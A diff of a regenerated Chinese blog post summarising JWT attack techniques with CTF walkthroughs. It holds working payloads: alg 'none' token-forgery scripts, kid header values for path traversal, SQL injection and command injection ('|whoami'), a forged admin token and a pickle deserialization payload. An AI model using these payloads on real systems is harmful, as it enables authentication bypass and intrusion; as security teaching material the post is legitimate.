@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 8.1.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
@@ -273,10 +273,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>jwt及其常见攻击方法总结，附相关练习<a id="more"></a></p>
+        <p>jwt及其常见攻击方法总结，附相关练习<span id="more"></span></p>
 <p>首发先知社区<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9376">https://xz.aliyun.com/t/9376</a></p>
 <h1 id="JWT攻击"><a href="#JWT攻击" class="headerlink" title="JWT攻击"></a><strong>JWT攻击</strong></h1><p><strong>JSON Web Token（JWT）是一种用于通信双方之间传递安全信息的简洁的、URL安全的表述性声明规范，经常用在跨域身份验证</strong></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cookie /<span class="keyword">session</span> /jwt  不同点</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>对于一般的cookie，如果我们的加密措施不当，很容易造成信息泄露，甚至信息伪造，这肯定不是我们期望的。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="keyword">session</span>:客户端在服务端登陆成功之后，服务端会生成一个sessionID，返回给客户端，客户端将sessionID保存到cookie中，<span class="keyword">session</span>保存在服务端，当客户访问量增加时，服务端就需要存储大量的<span class="keyword">session</span>会话，对服务器有很大的考验</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>jwt:在身份验证中，当用户使用他们的凭证成功登录时，<span class="type">JSON</span> Web Token将被返回并且必须保存在本地</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
 <p>客户端身份经过服务器验证通过后，会生成带有签名的 JSON 对象并将它返回给客户端。<strong>客户端在收到这个 JSON 对象后存储起来</strong></p>
 <p>在以后的请求中客户端将 JSON 对象连同请求内容一起发送给服务器，服务器收到请求后通过 JSON 对象标识用户，如果验证不通过则不返回请求的数据。</p>
@@ -293,6 +294,7 @@
 </blockquote>
 <p>完整的头部就像下面这样的JSON：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&#x27;typ&#x27;</span>: <span class="string">&#x27;JWT&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;alg&#x27;</span>: <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 
 
 <hr>
@@ -319,6 +321,7 @@
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;purplet&quot;</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;secretid&quot;</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
+
 <hr>
 <h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a><strong>signature</strong></h3><p><strong>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</strong> </p>
 <ul>
@@ -330,7 +333,8 @@
 </li>
 </ul>
 <p>这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。加密方式如下。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">&#x27;.&#x27;</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">&#x27;secret&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = <span class="title function_">base64UrlEncode</span>(header) + <span class="string">&#x27;.&#x27;</span> + <span class="title function_">base64UrlEncode</span>(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = <span class="title class_">HMACSHA256</span>(encodedString, <span class="string">&#x27;secret&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
 <hr>
 <p><strong>最后将这三部分用.连接成一个完整的字符串,构成了最终的jwt。</strong></p>
 <p><img src="https://img.npfs06.top/20210326205645.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
@@ -343,7 +347,8 @@
 <p><strong>将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为null或undefined时，jsonwebtoken会采用algorithm为none进行验证</strong></p>
 <p>因为alg为none,所以只要把signature设置为空（即不添加signature字段），提交到服务器，token都可以通过服务器的验证</p>
 <p><img src="https://img.npfs06.top/20210326205656.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">token &#x3D; jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  &quot;user&quot;: &quot;admin&quot;,</span><br><span class="line">&#125;,</span><br><span class="line">algorithm&#x3D;&quot;none&quot;,key&#x3D;&quot;&quot;</span><br><span class="line">).decode(encoding&#x3D;&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  &quot;user&quot;: &quot;admin&quot;,</span><br><span class="line">&#125;,</span><br><span class="line">algorithm=&quot;none&quot;,key=&quot;&quot;</span><br><span class="line">).decode(encoding=&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+
 <p>这里需要安装pyjwt库 </p>
 <blockquote>
 <p>pip install PyJWT</p>
@@ -368,9 +373,12 @@
 <p>这里运行之前需要些输入make命令，创建一个jwtcrack文件</p>
 <hr>
 <h2 id="修改KID参数"><a href="#修改KID参数" class="headerlink" title="修改KID参数"></a><strong>修改KID参数</strong></h2><p><code>kid</code>是jwt header中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥。我们可以通过修改kid参数进行目录遍历、sql注入、命令注入等攻击</p>
-<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#目录遍历</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#目录遍历</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#sql注入</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : &quot;<span class="type">HS256</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">    &quot;</span>typ<span class="string">&quot; : &quot;</span>jwt<span class="string">&quot;,</span></span><br><span class="line"><span class="string">    &quot;</span>kid<span class="string">&quot; : &quot;</span>aaaaaaa&#x27; UNION <span class="keyword">SELECT</span> <span class="symbol">&#x27;key</span>&#x27;;<span class="comment">-- &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#命令执行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#命令执行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <hr>
 <h2 id="修改JKU-X5U参数"><a href="#修改JKU-X5U参数" class="headerlink" title="修改JKU/X5U参数"></a><strong>修改JKU/X5U参数</strong></h2><p>类似于kid ,可以由用户进行输入，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。</p>
 <p>JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。</p>
@@ -385,7 +393,7 @@
 <p>分别访问这两个文件，可以猜测出存在<code>controllers/api.js</code><br>这里是怎么猜出来的，看了赵总的WP，凭经验</p>
 <p>koa框架主要目录：</p>
 <p><img src="https://img.npfs06.top/20210326205804.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
-<p><img src="https://img.npfs06.top/20210326205812.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210916132508.png" style="zoom:80%;"></p>
+<p><img src="https://img.npfs06.top/20210326205812.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><img src="http://img.npfs06.top/20210916132508.png" style="zoom:80%;" /></p>
 <p><strong>这里总的来说就是要在sid不为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间的前提下，使sid不能作为为全局变量 secrets  数组的索引，那么 secret 就会为空了</strong></p>
 <p>secretid可以利用空数组绕过（ JavaScript 是一门弱类型语言，空数组与数字比较永远为真）</p>
 <p><img src="https://img.npfs06.top/20210326205822.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
@@ -393,12 +401,14 @@
 <p><img src="https://img.npfs06.top/20210326205843.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
 <p>所以总的做法就是生成一个 secretid 为空数组的令牌，username 设置为 admin，加密方式为 none（空加密算法），即可绕过验证，使得最后登录时验证的用户名为 admin</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">token = jwt<span class="selector-class">.encode</span>(</span><br><span class="line">&#123;<span class="string">&quot;secretid&quot;</span>:<span class="selector-attr">[]</span>,</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;888&quot;</span>&#125;,</span><br><span class="line">algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span></span><br><span class="line">)<span class="selector-class">.decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(token)</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>==&gt; eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6Ijg4OCJ9.</p>
 <p><img src="https://img.npfs06.top/20210326205854.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
 <h1 id="ikun"><a href="#ikun" class="headerlink" title="ikun"></a><strong>ikun</strong></h1><p><img src="https://img.npfs06.top/20210326205906.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
 <p><img src="https://img.npfs06.top/20210326205915.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
 <p>这里提示我们购买lv6，写个脚本跑一下</p>
-<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://4134c719-6874-41bc-962f-ab08697fbc16.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    r=requests.<span class="built_in">get</span>(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> in r.<span class="built_in">text</span>:</span><br><span class="line">       <span class="built_in">print</span> (i)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">       </span><br><span class="line">--》lv6在<span class="number">181</span>页       </span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=&quot;http://4134c719-6874-41bc-962f-ab08697fbc16.node3.buuoj.cn/shop?page=&quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    r=requests.<span class="keyword">get</span>(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">       print (i)</span><br><span class="line">       break</span><br><span class="line">       </span><br><span class="line"><span class="comment">--》lv6在181页       </span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://img.npfs06.top/20210326205927.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
 <p><img src="https://img.npfs06.top/20210326205936.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
 <p><img src="https://img.npfs06.top/20210326205945.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
@@ -409,7 +419,7 @@
 <p>接下去就是考察python反序列化，感兴趣的同学可以自己去做一下</p>
 <p>利用reduce函数</p>
 <p>反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload(),protocol=<span class="number">0</span>)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span> (a)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload(),protocol=<span class="number">0</span>)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span> (a)</span><br></pre></td></tr></table></figure>
 <h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a><strong>reference</strong></h1><p><a href="https://xz.aliyun.com/t/6776#toc-6" target="_blank">攻击JWT的一些方法</a></p>
 <p><a href="https://cloud.tencent.com/developer/article/1620770" target="_blank">JWT在CTF中的问题</a></p>
 
@@ -526,7 +536,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -590,7 +600,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2026</span>
 
 
 <!--
